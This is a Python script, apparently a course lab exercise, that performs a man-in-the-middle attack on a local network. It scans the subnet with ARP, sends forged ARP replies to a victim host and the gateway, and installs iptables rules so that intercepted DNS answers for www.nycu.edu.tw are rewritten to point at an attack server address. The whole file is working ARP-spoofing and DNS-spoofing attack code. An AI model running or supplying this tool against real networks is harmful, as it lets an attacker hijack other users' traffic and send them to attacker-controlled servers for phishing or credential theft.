#!/usr/bin/env python3

from os import system
import netifaces as ni
from scapy.all import ARP, Ether, srp, send, IP, UDP, DNS, DNSRR, DNSQR
from netfilterqueue import NetfilterQueue
from math import log2
import time

#import threading
import multiprocessing

from netfilterqueue import NetfilterQueue

arp_table = {}
hot_ip = None
gtw_ip = None
hot_mc = None

def arp_scan():
	global arp_table, hot_ip, gtw_ip, hot_mc	
	
	broadcast_mac = Ether(dst='ff:ff:ff:ff:ff:ff')

	gateway = ni.gateways()[ni.AF_INET][0]
	gtw_ip = gateway[0]
	itf_if = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
	hot_mc = ni.ifaddresses(gateway[1])[ni.AF_LINK][0]['addr']
	hot_ip = itf_if['addr']
	msk_ln = 32 - sum([int(log2(256 - int(i))) for i in itf_if['netmask'].split('.')])
	
	subnet = hot_ip + '/' + str(msk_ln)
	arp = ARP(pdst=subnet)
	
	packet = broadcast_mac / arp	
	result = srp(packet, timeout=2, verbose=False)[0]

	for i in result:
		arp_table[i[1].psrc] = { "ip": i[1].psrc, "mac": i[1].hwsrc }

	print("Available devices")
	print("-------------------------------------")
	print("IP Address       MAC Address         ")
	print("-------------------------------------")
	for i in arp_table:
		if i == gtw_ip or i == hot_ip: continue;
		print("%-15s %18s" % (i, arp_table[i]['mac']))
	
	print("-------------------------------------")
	return


def send_fake_arp():
	rt_mac = arp_table[gtw_ip]['mac']

	for i in arp_table:	
		if i == gtw_ip or i == hot_ip: continue;
		arp_to_victim = ARP(op=2, pdst=i,      hwdst=arp_table[i]['mac'], psrc=gtw_ip, hwsrc=hot_mc)
		arp_to_router = ARP(op=2, pdst=gtw_ip, hwdst=rt_mac,              psrc=hot_ip, hwsrc=hot_mc)
		
		# Local demo use
		if i != '192.168.0.163': continue;

		send(arp_to_victim, verbose=False)
		send(arp_to_router, verbose=False)
	return 



target_domain = 'www.nycu.edu.tw.'
attack_server = '140.113.207.237'

def callback(pkt):
	spkt = IP(pkt.get_payload())

	if spkt[DNSQR].qname == target_domain.encode('ascii'):
		
		response = DNSRR(rrname = target_domain, rdata = attack_server)
		
		spkt[DNS].an = response
		spkt[DNS].ancount = 1

		del spkt[IP].len
		del spkt[IP].chksum
		del spkt[UDP].len
		del spkt[UDP].chksum

		print("Got one target DNS query!")
		pkt.set_payload(bytes(spkt))

	pkt.accept()
	return

def fake_dns():
	global closing

	system('iptables -I FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
	system('iptables -I FORWARD -j REJECT -p tcp --sport 53')

	queue = NetfilterQueue()
	queue.bind(23, callback)
	try:
		queue.run()
	except KeyboardInterrupt:
		queue.unbind()
		print("\n\nUnbind successfully!")
	return

def main():
	arp_scan()
	send_fake_arp()

# trd = threading.Thread(target = fake_dns)
	trd = multiprocessing.Process(target = fake_dns, args=())
	trd.start()

	while True:
		try:
			send_fake_arp()
			time.sleep(2)
		except KeyboardInterrupt:
			system('iptables -D FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
			system('iptables -D FORWARD -j REJECT -p tcp --sport 53')
			trd.terminate()
			break	
	
	print('Closing program...')
	return 


if __name__ == '__main__':
    main()
